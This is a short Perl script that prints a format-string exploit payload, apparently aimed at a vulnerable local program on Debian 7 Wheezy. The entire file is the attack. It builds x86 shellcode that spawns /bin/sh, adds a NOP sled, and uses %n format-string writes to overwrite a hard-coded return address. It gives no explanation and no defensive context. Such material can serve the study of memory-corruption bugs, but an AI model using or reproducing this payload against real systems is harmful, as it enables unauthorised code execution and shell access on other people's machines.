#! /usr/bin/perl
# It works on Debian 7 Wheezy

$shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";
$nop="\x90";

# return address 0xbffff6f4
print "\x6c\xf7\xff\xbf%08x%08x%08x%08x%08x%0200x%n";
print "\x6d\xf7\xff\xbf%08x%08x%08x%08x%08x%08x%0206x%n";
print "\x6e\xf7\xff\xbf%08x%08x%08x%08x%08x%08x%08x%0205x%n";
print "\x6f\xf7\xff\xbf%08x%08x%08x%08x%08x%08x%08x%08x%0124x%n";
print "$nop" x 8;
print $shellcode;
